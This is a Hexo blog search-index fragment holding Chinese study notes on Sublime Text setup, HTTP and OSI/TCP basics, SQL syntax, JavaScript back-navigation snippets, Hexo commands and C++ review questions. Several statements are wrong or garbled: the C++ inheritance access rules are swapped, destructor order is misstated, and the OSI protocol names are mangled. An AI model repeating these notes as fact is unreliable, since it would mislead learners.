    <content type="text"><![CDATA[submit text 3安装PyV8有时下载 Emmet 后，使用会报出关于 PyV8 的错误这时需要我们手动去安装 PyV8 1、在github上下载需要的包:传送门 2、把下载的压缩包解压到如下路径: ![](https://hdwcna.sn.files.1drv.com/y4mjH5OVRAwB6G0JaIFCGqy8W_nzQAqVDvaJ9Oi3smCZIY9JbR7eFWZSkBMXSLKsRu59f5AzuS5r7heiOKdWv6xtqN3JkD_Wg66FaF5q5_sQfuLCK6RXvEEKdJieai8r3LOoHCtnpqK-KMRJedq2-6r9r9l-CK3JG-YwKdOtxyXZlSasp-qBizzYi5nucfmItyjv96gw5ld3NWBz44J4DmqFg?width=681&height=29&cropmode=none) > - 3、重启submit text 3即可 submit text 3在浏览器中预览html等文件 1、安装插件:“view in browser” 2、打开:“Preferences-&gt;Key Bindings-User”，输入如下内容:[ { &quot;keys&quot;: [&quot;ctrl+alt+f&quot;], &quot;command&quot;: &quot;open_in_browser&quot; },] submit text 3在指定路径下在浏览器中预览 1、安装插件:“SideBarEnhancements” 2、打开:“Preference-&gt;Package Settings-&gt;Side Bar-&gt;Settings User-User”，添加如下: 123&#123; "default_browser": "chrome" //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari&#125; 3、在侧边栏右键，找到“Project-&gt;Edit Preview URLs”，添加如下: 123456&#123; "项目路径":&#123; "url_testing": "localhost地址", "url_production": "线上地址" &#125;&#125; 4、打开:“Preference-&gt;Package Settings-&gt;Side Bar-&gt;key Bindings-User”，添加如下: 1234567891011[&#123; "keys": ["ctrl+shift+f"], "command": "side_bar_open_in_browser", "args": &#123; "paths": [], "type": "testing", "browser": "" &#125; &#125;]]]></content>
      <tags>
        <tag>submit text 3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web基础知识]]></title>
    <url>%2F2018%2F07%2F11%2Fweb%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Url组成![](https://i.imgur.com/WJ0UKcd.png) HTTP请求方式HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URL制定的资源的不同操作方式，具体介绍如下: 1、OPTIONS: 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送”*”的请求来测试服务器的功能性。 2、HEAD: 向服务器索要与个体请求相一致的响应，只不过响应将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 3、GET: 向特定的资源发出请求。 4、POST: 向指定资源提交数据进行处理请求(例如提交表单或者上传文件)。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 5、PUT: 向指定资源位置上传其最新内容。 6、DELETE: 请求服务器删除Request-URL所标识的资源。 7、TRACE: 回显服务器收到的请求，主要用于测试或诊断。 8、CONNECT: HTTP/1.1协议中预留给能够将连接改为管道的代理服务器。 GET和POST的区别 table th:first-of-type { width:10%; } GET POST 后退/刷新 无害 数据会被重新提交 书签 可收藏为书签 不可收藏为书签 缓存 能被缓存 不能缓存 编码类型 Application/x-www-form-urlencoded Application/x-www-form-urlencoded或multiparty/form-data。为二进制数据使用多重编码 历史 参数保存在浏览器历史中 参数不会保存在浏览器历史中 对数据长度的限制 当发送数据时，GET方法向URL添加数据；URL的长度是受限制的(URL的最大长度是2048个字符) 无限制 对数据类型的限制 只允许ASCII字符 没有限制。也允许二进制数据 安全性 与POST相比，GET的安全性较差，因为所发送的数据是URL的一部分。所以在发送密码等 敏感信息时绝不要使用GET。 POST比GET更加安全，因为参数不会被保存在浏览器历史或web服务器日志中。 可见性 数据在URL中对所有人都都是可见的 数据不会显示在URL中 Javascript由哪几部分组成参考来源:https://www.jianshu.com/p/f6c94cfa3139 虽然JavaScript和ECMAScript通常被人用来表达相同的意思，但JavaScript的含义去比ECMA-262中规定的多得多。一个完整的JavaScript实现应由三个部分组成: 1.核心(ECMAScript) 2.文档对象模型(DOM) 3.浏览器对象模型(BOM) 核心(ECMAScript) 由ECMA-262定义的ECMAScript是一种在国际认可的标准的脚本语言规范，与Web浏览器没有依赖关系。ECMA-262标准主要规定了这门语言由以下组成部分: 1.语法 2.变量和数据类型 3.关键字和保留字 4.操作符 5.控制语句 6.对象 2009年ECMAScript 5.0版正式发布。在很长一段时间，使用javaScript都是按照5.0的标准。2015年ECMAScript 6发布正式版本，官方称为ECMAScript 2015。ECMAScript定义了脚本语言的所有属性、方法和对象。因此抵用web客户端脚本编码时一定要遵循ECMAScript标准。 文档对象模型(DOM) DOM(文档对象模型)是 HTML 和 XML 的应用程序接口(API)。DOM 将把整个页面规划成由节点层级构成的文档。HTML或XML页面中的每个组成部分都是某种类型的节点，这些节点又包含着不同类型的数据。 浏览器对象模型(BOM) IE 3.0 和 Netscape Navigator 3.0 提供了一种特性 - BOM(浏览器对象模型)，可以对浏览器窗口进行访问和操作。使用 BOM，开发者可以移动窗口、改变状态栏中的文本以及执行其他与页面内容不直接相关的操作。 OSI模型:(即开放式通信系统互联参考模型)OSI/RM协议是由IOS(国际标准化组织)制定的，他有三个基本功能:提供给开发者一个必须的、通用的概念以便开发完善、可以用来解释不同系统的框架。 OSI将计算机网络体结构划分为七层: 物理层:将数据转化为可通过物理介质传送的电子信号。相当于有剧中的搬运工人。物理层规定了激活、维持、关闭通信端点之间的机械性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的物理媒体。在这一层，数据单位为比特(bit)。属于物理层定义的典范规范代表包括:EIA/TIA RS-232、EIA/TIA RS-449、V.35、RJ-45等。 数据链路层:决定访问网络介质的方式。在此层将数据分帧，并处理流控制。本层指定拓补结构并提供硬件寻址。相当于邮局中的拆装箱工人。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括:物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。在这一层，数据的单位成为帧。数据链路层协议的代表包括:SDLC、HDLC、PPP、STP、帧中继等。 网络层:使用权数据路由经过大型网络。相当于邮局中的排序工人。网络层负责对子网间的数据包进行路由选择。网络层还可以实现拥塞控制、网际互联等功能。在这一层数据的单位成为数据包。网络层协议的代表包括:IP、PX、IP、SPF、RP、ARP、CMP、MP等。 传输层:提供终端到终端的可靠连接。相当于公司中跑邮局的送信职员。传输层是第一个端到端，即主机到主机的层次。传输层负责将数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。在这一层输局的单位称为数据端。传输层协议的代表包括:TCP、UDP、SPX等。 会话层:允许用户使用简单易记的名称建立连接。相当于公司中收寄信、写信封与拆信封的秘书。会话层管理主机之间的会话进程即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。 表示层:协商数据交换格式。相当于公司中简报老板、替老板写信的助理。表示层对上层数据或信息进行变换以保证一个主机应用层的信息可以被另一个主机的应用程序理解。表示层的数据转换包括输局的加密、压缩、格式转换等。 应用层:用户的应用程序和网络之间的接口老板。应用层为操作系统或网络应用程序提供访问网络服务的接口。应用层协议的代表包括:Telnet、FTP、HTTP、SNMP等。 TCP三次握手，四次挥手TCP三次握手:第一次握手:客户端发送syn包(syn=x)到服务器，并进入到SYN_SEND状态，等待服务器确认。 第二次握手:服务器收到syn包，必须确认客户端的SYN(ack=x+1)，同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。 第三次握手:客户端收到服务区的SYN+ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端进入ESTABLISHED状态，完成三次握手。 握手构成中传送的包里不含数据，三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP连接一旦建立，在通信双方的任何一方主动关闭连接前，TCP链接都将被一直保持下去。确认号:其数值等于发送方的发送序号+1(即接收方期望接受的下一个序列号)。 TCP四次挥手:第一次挥手:主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送。 第二次挥手:被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1(与SYN相同，一个FIN展映一个序号)。 第三次挥手:被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发送数据。 第四次挥手:主动关闭方收到一个FIN包后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>url</tag>
        <tag>HTTP</tag>
        <tag>Javascript</tag>
        <tag>OSI模型</tag>
        <tag>TCP三次握手，四次挥手</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL常用语句--增删改查]]></title>
    <url>%2F2018%2F07%2F02%2FSQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[查 查全部: select * from &lt;tablename&gt;;条件查询:select &lt;filed&gt; from &lt;tablename&gt; where &lt;field&gt;=&lt;key&gt;;带有函数查询: select count(*) from &lt;tablename&gt;;模糊查询: select &lt;field&gt; from &lt;tablename&gt; where &lt;field&gt; like ‘%value%’; 增 添加库: create database &lt;databasename&gt;;创建新表: create table &lt;tablename&gt; (col1 type1, col2, ...); 主键自增: create table test1(id int primary key auto_increment,name varchar(20))auto_increment=1;插入数据: insert into &lt;tablename&gt;(field1,field2……) values(value1,value2………);增加一列: alter table &lt;tablename&gt; add column &lt;colname&gt; &lt;coltype&gt;;添加主键: alter table &lt;tablename&gt; add primary key(col); 改 更新: update &lt;tablename&gt; set &lt;field&gt;=&lt;value&gt; where &lt;条件&gt;; 删 删除库: drop database &lt;databasename&gt;;删除表: delete from &lt;tablename&gt; where &lt;条件&gt;;(会留下日志文件，能被还原修复)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;truncate table &lt;tablename&gt;;(不会留下日志文件，不能被还原修复) 子句: where子句:= , &gt; , &lt; , &lt;&gt;(不等于) , &gt;= , &lt;=order by子句:asc (升序) , desc(降序)]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页返回上一页的几种方法]]></title>
    <url>%2F2018%2F07%2F01%2F%E9%A1%B5%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%B8%80%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[以按钮点击的方式实现 &lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:window.history.back(-1);&quot;&gt;或者&lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:history.back(-1);&quot;&gt; 一点击图片的方式实现 &lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:window.history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt;或者&lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt; 文字点击的方式实现 &lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回上一页&lt;/a&gt;或者&lt;a href=&quot;#&quot; onClick=&quot;javascript:history.back(-1);&quot;&gt;返回上一页&lt;/a&gt; 图片链接的方式实现 &lt;a href=&quot;javascript:window.history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt;或者&lt;a href=&quot;javascript:history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt; 过几秒钟后返回上一页 &lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;window.history.go(-1)&quot;,3000)&lt;/script&gt;或者&lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;history.go(-1)&quot;,3000)&lt;/script&gt;]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo常用命令]]></title>
    <url>%2F2018%2F06%2F29%2FHexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[hexo s hexo shexo s 是 hexo serve 的缩写，用于本地预览: http://localhost:4000/ hexo clean 清除缓存文件 db.json 和已生成的静态文件 public网页异常清除缓存 hexo new hexo new 笔记名称新建一篇标题为“笔记名称”的文章 hexo d hexo dhexo d 是 hexo deploy 的缩写。用于自动生成静态文件，并部署到仓库。 hexo g hexo ghexo g 是 hexo generate 的缩写。用于生成网站静态文件到默认的 public 文件夹。 hexo new page hexo new page name新建一个标题为 name 的页面，默认链接地址为/name/页面不会出现在首页文章列表和归档中，也不支持分类和标签。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++复习！！！(课本:谭老爷爷版)]]></title>
    <url>%2F2018%2F06%2F24%2Fc%2B%2B%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[一、从C到C++ C++如何实现I/O？它的优势在哪里？ 1、c++中I/O的概念 在c++中有一个stream，这个类，所有的I/O都以这个“流”为基础，包括我们认识的文件I/O。stream有两个重要的运算符: a、插入器(&lt;&lt;):向流输入数据。 b、析取器(&gt;&gt;):从流中读取数据。 2、与c语言相比之下的优势 1、最大的好处时完成了对流操作的封装。原来文件操作都是一个个分开的函数，现在的操作都是对象的方法。2、stream适用于设备输入和输出的。fstream是stream的派生类，即文件流(设备对象是文件)，作为文件在c++中的一个抽象对象。 什么是重载函数？如何区分重载函数？ 1、什么是重载函数？ c++允许在同一作用域中用同意函数名来定义多个函数，这些函数的参数个数和参数类型不相同，这些同名的函数用来实现不同的功能，这就是函数的重载，即一个函数名多用。 2、区分函数重载 1、函数形参的个数； 2、函数形参的类型； 3、形参的顺序； 4、不能把返回值作为函数重载的条件，原因是编辑器在编译时不回去判断函数的返回类型，函数只有调用后，编译器才会去验证返回类型，所以返回值类型不能做为函数重载的依据； 5、常函数const可以作为函数重载的判断依据，原因:重载[]运算符时，有没有const的区别是:有const只读，没有const读写都可以。 什么是函数模板？为什么要使用函数模板？ 1、什么是函数模板？ 建立一个通用函数，其函数类型和形参不具体指定，用一个虚函数的类型来代表，这个通用的函数就称为函数模板。 例:max函数模板 template&lt;typename T&gt;T max(T a, T b, T c) {} 2、为什么要使用函数模板？ 简化对同名的知识形参类型不同的函数的定义。 使用带有默认参数的函数时，要注意些什么？ 1、如果函数的定义在函数调用之前，则应在函数定义中给出默认值。 2、一个函数不能既作为重载函数，又作为有默认参数的函数。 什么是变量的引用？要注意什么？ 在c++中，变量的“引用”就是变量的别名，因此，引用又称别名。建立“引用”的作用是为一个变量再起另一个名字，一边在需要时可以方便、间接地引用该变量。对一个变量的“引用”的所有的操作，实际上都是对其所代表的(原来的)变量的操作。 例:有一个变量a，想给他起一个别名b 12int a;int &amp;b = a; ATTENTION:由于引用不是独立的变量，编译系统给它单独分配储存单元，因此，在建立引用时只有声明没有定义，只是声明它和原有某一变量的关系。 为什么要使用inline函数？ 为了提高效率。 调用函数时需要一定的时间，如果有些函数需要频繁使用，则累计所用时间会很长，从而降低程序的执行效率。c++提供一种提高效率的方法，即在编译时，将所调用函数的代码嵌入到主调函数中。这种嵌入到主调函数中的函数称为内联函数。 作用域限定符“::”的作用是什么 在c++中，不同作用域内声明的变量可以同名，当局部变量和全局变量同名时，在局部变量中引用全局变量用到作用域限定符“::”。当全局变量和局部变量名字相同，重载时，就规定:用 “:: + 全局变量名” 来称呼全局变量。 二、类和对象 程序 = 对象 + 对象对象 = 算法 + 数据结构 什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？ 对象: 客观世界中任何一个事物都可以看成一个对象(object)。 类: 类是所有面向对象语言的共同特征，所有面向对象的语言都提供了这种类型。 抽象: 类是对象的抽象，而对象是类的具体实例。 数据抽象: 只向外界提供关键信息，并隐藏其后台的实现细节，即只表现必要的信息而不呈现细节。数据抽象是一种依赖于接口和实现分离的编程(设计)技术。 类的声明: 12345678class 类名 &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;; 类的定义: 12345678910111213141516171819202122232425//1、先声明，后定义://(1)、class 类名 对象名1,对象名2,...;//(2)、类名 对象名1,对象名2,...;//2、声明同时定义:class 类名 &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;对象名1,对象名2,...;//3、不出现类名直接定义对象(非常 不建议 使用):class &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;对象名1,对象名2,...; c++中有哪些权限限定符？各起什么作用？ private private将成员声明为私有成员，只能被本类中的成员函数引用，类外不能调用(友元类除外)。 public public将成员声明为公有成员，既可以被本类成员函数所引用，也可以被类的作用域内的其他函数所引用。 protected protected将成员声明为受保护成员，不能被类外访问，但是可以被派生类的成员函数访问。 什么是类的封装？封装的原则是什么？ 1、什么是封装？ 封装可以隐藏实现细节，使代码模块化。封装是把过程和数据包围起来，对数据的访问只能通过已定义的界面。在面向对象编程上可理解为:把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。 2、封装的原则是什么？ 简化用户接口，隐藏实现细节，这个是封装的根本目的。封装的难点在于如何设计接口。其一:必须保证接口是功能的全集，即接口能够覆盖所有需求。不能完成必要功能的封装是没有意义的。其二:尽量使接口是最小冗余的。这是为了简化类使用者的学习和使用，难用的接口是最容易让人遗忘的。冗余接口的存在是被允许的，但必须保证冗余接口是有效的。也就是说，增加冗余接口会带来很大的好处，比如性能的飞升。其三:要保证接口是稳定的，将接口和实现分离，并将实现隐藏，就是为了能保护类使用者在类的实现细节改变的情况下，不必随时修改。一旦接口被公布，永远也不要改变它。 同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？ 是同一段代码。 通过this指针:每一个成员函数中都包括这个指针的名字是固定的，称为this。它是指向对象的指针，他的值是当前被调用的成员函数所在的对象的起始地址。例: 1234567int Box::volume()&#123; return (height * width * length);&#125;//C++把它处理为:int Box::volume(Box * this)&#123; return (this-&gt;height * this-&gt;width * this-&gt;length);&#125; 类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？ 区别1:静态成员函数实际上是一个全局函数,不依赖一个类的对象. 而属于类，不创建对象也可调用，静态成员函数没有this指针。普通成员函数依赖一个类的对象,也就是它有一个隐藏的调用参数(this)指针,必须指向一个类的对象。 区别2:静态函数只能访问类中的静态成员变量； 区别3:如果成员函数想作为回调函数来使用，如创建线程等，一般只能将它定义为静态成员函数才行。 三、类和对象的进一步讨论 构造函数、析构函数的英文单词是什么？ 构造函数——constructor 析构函数——destructor 构造函数的特点是什么？析构函数的特点是什么？ c++提供构造函数，来处理对象的初始化。构造函数是一种特殊的成员函数，与其他成员函数不同，不需要用户来调用它，而是在建立对象时自动执行。构造函数只是起初始化值的作用，但实例化一个对象的时候，可以通过实例去传递参数，从主函数传递到其他的函数里面，这样就使其他的函数里面有值了。规则，只要你一实例化对象，系统自动回调用一个构造函数，就算不写，编译器也自动调用一次。 析构函数与构造函数同名，但该函数前面加~。析构函数没有参数，也没有返回值，而且不能重载，在一个类中只能有一个析构函数。当撤销对象时，编译器也会自动调用析构函数。每一个类必须有一个析构函数，用户可以自定义析构函数，也可以是编译器自动生成默认的析构函数。一般析构函数定义为类的公有成员。 构造函数、析构函数的执行顺序是什么？ 先构造的先执行析构。 在C语言中，我们说main()函数是程序的入口，是最先被调用的函数，在C++中情况是这样吗？如果不是请说明原因，并举出实例。 c++中不是这样。 因为存在构造数据类型的定义对象定义，且对象为全局对象的话，则该类对象所属的构造类型的构造函数在main()函数之前执行。 const关键字const在c++中要尽可能的使用 table th:first-of-type { width:30%; } 形式 含义 Time const t1; t1是常对象，其值在任何情况下都不能改变 void Time::fun()const; fun是Time类中的成员函数，可以引用，但不能修改本类中的成员数据 Time * const p; p是指向time类对象的常指针变量，p的值(p的指向)不能改变 const Time * p; p是指向Time类常对象的指针变量，p指向的类对象的值不能通过p来改变 const Time &amp;t1 = t; t1是Time类对象t的引用，二者指向同一储存空间，t的值不能改变 - &gt; const的作用是:数据的保护 - 常成员变量 类的常成员变量是用const关键字声明的成员变量，其值不可改变，它的初始值必须通过构造函数的初始化列表方式完成。一般将一个类中不可改变的值声明为常成员变量。但const成员变量有一个缺点:该类的所有对象都会const成员变量，而不是整个类共用一个。这种情况下，const常和static一起使用。 const成员函数const成员函数语法为:int Obj::Func const;这表明成员函数Func const是个常成员函数，它的作用是表明只能引用类中的数据成员，而不能修改类中的数据成员。 常对象语法为:const obj o(10); 或 obj const o(10);用const声明的对象为常对象，常对象必须初始化，如果一个对象被声明为const对象，则该对象的数据成员不可修改。即const对象不能调用该对象的非const成员函数。 指向const数据的指针定义指针时，在指针的类型前面加上const表明该指针指向的对象是个常量。 const指针在定义指针时，在指针的前面加上const表明该指针是一个常量，它必须被初始化。 const在参数中的使用const在参数类型为指针或引用时经常被使用，这表明这个指针或引用所指向的数据不允许被修改，这样就保证了在被调函数中不能因为误操作而改变了主调函数中的值。 初始化列表的语法是怎样的？ 如下:1234567891011121314类名::构造函数名([参数表])[:成员初始化表]&#123;[构造函数体]&#125;//例:class Student&#123;public: Student(int n, char s, nam[]):num(n), sex(s)&#123; strcpy(name, nam); &#125;private: int num; char sex; int name[20];&#125;; 在C++中为什么使用new/delete，而不是malloc()/free()来来动态创建对象？如何使用new/delete来动态创建数组？ c语言中使用库函数malloc()和free()来动态申请和释放内存空间，但是存在两个问题:1、分配的大小需人为计算;2、只分配空间，而不涉及类型。c++使用了运算符new和delete来取代malloc()和free()函数。动态分配/释放内存。 例:动态创建一维数组123456789101112131415#include &lt;iostream&gt;using namespace std;int main()&#123; int n; cin &gt;&gt; n; //动态分配一维数组 int *arr = new int [n]; for(int i = 0; i &lt; n; i++) cin &gt;&gt; arr[i]; for(int i = 0; i &lt; n; i++) cout &lt;&lt; arr[i] &lt;&lt; " "; //释放arr数组 delete[] arr; return 0;&#125; 什么是对象的复制？什么是对象的赋值？ 对象的赋值 一般形式:对象名1 = 对象名2；对象的赋值只是用赋值号右边的对象的数据覆盖了赋值号左边的的对象的数据成员。因此必须使用有默认参数值的构造函数，以保证左值能被初始化。 对象的复制 一般形式:类名 对象2(对象1)； 或 `类名 对象2 = 对象1;例: 123456789101112131415161718class Student&#123;pubilc: Student ()&#123;m_strName="Jim";&#125; /* 默认的拷贝构造函数: Student (const Student &amp;stu)&#123;&#125; */ Student(const Student &amp;stu)&#123;m_strName = stu.m_strName;&#125; //显性定义的拷贝构造函数private: string m_strName;&#125;;int main()&#123; Student stu1; Student stu2 = stu1; Student stu3(stu1); return 0;&#125; 什么是深拷贝/浅拷贝？ 拷贝构造函数的语法如何？ 浅拷贝 对象拷贝时，仅仅是简单的值拷贝，这称为“浅拷贝”，这是系统默认的拷贝模式，不需要编程实现。 深拷贝 对象拷贝时，对堆中的数据编程进行拷贝，这称为“深拷贝”，这种拷贝模式需要编程实现。 拷贝构造函数 拷贝构造函数中只有哟个参数，为本类对象的一个引用，并通常使用const修饰。语法: 1234obj(const obj &amp;o)&#123; no = o.no; cout &lt;&lt; "copy constructor" &lt;&lt; no &lt;&lt; endl;&#125; static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？ static数据成员拥有一块单独的储存区(不再类对象内部)，不管该类创造了多少个对象。所有该类的对象共享这块区域，这就为这些类之间提供了一种相互通信的方法，并且它不会占据对象的储存空间。他的名字是属于类的(例:Circle::PI)，这样可以很大程度上解决全局数据的名字冲突问题。它是有权限控制的，也就是说他可以是private的。 除了数据成员能定义为static的，成员函数也可以定义为static的。与static数据成员一样，static成员函数也是属于类的，而不是属于对象的。static成员函数是属于类的，所以它没有this指针，不创建对象就可以被调用。它的这个特点决定了static成员函数只能访问类中的static数据成员和static成员函数。与类的static数据成员一样，推荐使用类方式引用类的static成员函数。 在类内提供的仅仅是static数据成员的声明(编译器没有给它分配空间)，而不是定义，所以不能使用构造函数对其进行初始化，static数据成员的初始化必须在类外完成。static数据成员在使用时，既可以使用对象方式引用，也可以使用类方式引用，通常使用类方式引用，以表明它是一个static数据成员。 为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？ 友元机制可以带来一些便利。 友元可以实现在类的外部访问一个类的private成员 友元机制虽然可以带来一些便利，但是它严重破坏了程序的封装性，也有影响程序的可读性，所以要慎重使用友元。 四、运算符重载 在C++中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？ 五、继承和派生 继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？ 继承——inheritance。继承就是在已有类的基础上建立一个新类的过程。其中已经存在的类称为基类(base class)，新建立的类称为派生类(derived class)，从基类产生派生类的过程称为派生。 继承的语法: 1234class 派生类名: [继承方式] 基类名 &#123; //继承方式不写默认是private。 派生类新增加的成员&#125; 继承方式限定: private:基类的公有成员和保护成员在派生类中保持原有访问属性，其私有成员仍为基类私有。 public:积累的公有成员和保护成员在派生类中成了私有成员，其私有成员仍为基类私有。 protected:积累的公有成员和保护成员在派生类中成了保护成员，其私有成员仍为基类私有。 继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？ 继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。 派生类要无条件的接收基类中的全部成员。 派生类尽管拥有基类的所有的成员，但是派生类不能访问基类private的成员。 派生类从基类中继承的成员在不同的继承方式下的访问权限 ![](https://hdwena.sn.files.1drv.com/y4mhMErgzce0OjomgHTh_UJda9Dha1RoPDfRdvbQdw6z2vtiulYKo4l89RC8FBLsUEN7NHN0I8-RcpUKyyim93Gtb1ckcUYLDxQnIAAQvIIK2HAC0YOZshMXXpz2INa5S_lq88gY0d1bk8i6uIlXBWPip1S_e2rKV7CueKh7Ykj4faOsqIkFOO4XqpMoESSDg7r3I6OMZTvX4FfIH7X5mQawA?width=944&height=299&cropmode=none) 组合(子对象)的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？ 子对象就是类对象中内嵌的对象。当派生类中存在子对象时，派生类的构造函数需要依次完成以下3部分:1、先调用基类构造函数初始化基类数据。2、再调用子对象的构造函数初始化子对象中的数据。3、最后初始化自己的数据成员。 当继承和组合都存在时，构造和析构的顺序如何？ 哪些地方必须使用初始化列表？ 什么是overriding、overload？什么是upcasting？ 多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？ 六、多态性和虚函数 什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？ 如何实现多态性？ 虚函数是如何实现的(考试不会考)？ 动态/静态绑定(binding、联编)的优缺点各是什么？ 什么是纯虚函数？什么是抽象类？其意义各自是什么？ 七、输入输出流 C++I/O的优势在哪(和前面第一章的类似)？ 标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？ 如何使用文件流进行输入/输出(步骤)？ 什么是字符串流？它有什么用好处？ 八、C++工具 实现异常的三个关键字是什么？大致的作用是什么？]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
</search>
